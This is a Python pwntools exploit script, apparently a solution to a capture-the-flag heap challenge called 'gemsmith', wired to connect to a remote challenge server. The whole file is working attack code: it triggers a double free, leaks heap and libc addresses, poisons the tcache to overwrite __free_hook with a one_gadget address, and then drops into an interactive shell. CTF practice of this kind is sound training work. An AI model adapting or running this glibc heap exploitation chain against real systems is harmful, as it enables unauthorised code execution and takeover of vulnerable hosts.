#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './gemsmith_patched')

context.terminal = 'wt.exe wsl -d Ubuntu'.split()
context.log_level = 'debug' if args.DEBUG else 'info'
_, host, port = 'nc 94.237.53.134 38684'.split()

libc_path = './libc.so.6'
ld_path = './ld-linux-x86-64.so.2'
libc = ELF(libc_path) if libc_path else exe.libc
ld = ELF(ld_path) if ld_path else None

class LogAddressHex:
    def __getattribute__(self, name):
        try:
            resolved = eval(name)
        except:
            log.error(f'"{name}" doesn\'t exist')
            return lambda: ...
        
        if hasattr(resolved, 'address'):
            resolved = getattr(resolved, 'address')
            
            if not resolved & 0xfff:
                log.success(term.text.bold_green(f'{name}.address & 0xFFF == 0'))
            else:
                log.warn(term.text.bold_yellow(f'{name}.address & 0xFFF != 0'))
            
        log.info(term.text.blue(f'{name} : {resolved:#x}'))
        return lambda: ...

logx = LogAddressHex()

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    kw['env'] = {"SHELL": "/bin/sh"}
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL or args.LOCAL_LIBC:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def ua(x):
    return int.from_bytes(x, 'little')

def se(x):
    return str(x).encode()

def cyc(x):
    n = 8 if context.arch == 'amd64' else 4
    return cyclic(x, n=n)
def add(idx, sz,x ):
    p.sendline(b'1')
    p.sendline(se(idx))
    p.sendline(se(sz))
    p.send(x)

def puts(idx):
    p.sendline(b'3')
    p.sendline(se(idx))
gdbscript = '''
b *(main)
continue
'''.format(**locals())

p = start()
sz = 0x90
weird = b'\xe3\x80\x80'
a = '＞'.encode()

p.sendlineafter(a, b'1')
p.sendlineafter(weird, b'0')
p.sendlineafter(weird, se(sz))
p.sendlineafter(weird, b'asdfadspfjadsfajsdfklajdfijd')


p.sendlineafter(a, b'2')
p.sendlineafter(weird, b'0')

p.sendlineafter(a, b'2')
p.sendlineafter(weird, b'0')
    
p.sendlineafter(a, b'3')
p.sendlineafter(weird, b'0')

p.recvuntil(weird)
p.recvuntil(weird)
p.recvuntil(weird)
p.recvuntil(weird)
p.recvuntil(weird)

leak_heap = ua(p.recv(6))
perthread = (leak_heap) & ~0xfff + 0x10
logx.leak_heap, logx.perthread

p.sendlineafter(a, b'1')
p.sendlineafter(weird, b'0')
p.sendlineafter(weird, se(sz))
p.sendlineafter(weird, p64(perthread))
    
p.sendlineafter(a, b'1')
p.sendlineafter(weird, b'0')
p.sendlineafter(weird, se(sz))
p.sendlineafter(weird, p64(0x1337))

p.sendlineafter(a, b'1')
p.sendlineafter(weird, b'0')
p.sendlineafter(weird, se(sz))
p.sendafter(weird, b'\x11' * (sz-32 - 6 * 8))

p.sendlineafter(a, b'2')
p.sendlineafter(weird, b'0' )
tsz = 0x90

p.sendlineafter(a, b'3')
p.sendlineafter(weird, b'0')

p.recvuntil(weird)
p.recvuntil(weird)
p.recvuntil(weird)
p.recvuntil(weird)
p.recvuntil(weird)


leak_libc = ua(p.recv(6))
libc.address = leak_libc - (libc.sym.main_arena + 96)
logx.libc

p.sendlineafter(a, b'1')
p.sendlineafter(weird, b'0')
p.sendlineafter(weird, se(sz))
p.sendafter(weird, b'\0' *(sz-32 - 6 * 8) + p64(libc.sym.__free_hook))


p.sendlineafter(a, b'1')
p.sendlineafter(weird, b'0')
p.sendlineafter(weird, se(0x18))
p.sendafter(weird, p64( libc.address + 0x4f322 ))

p.sendlineafter(a, b'2')
p.sendlineafter(weird, b'0')


p.interactive()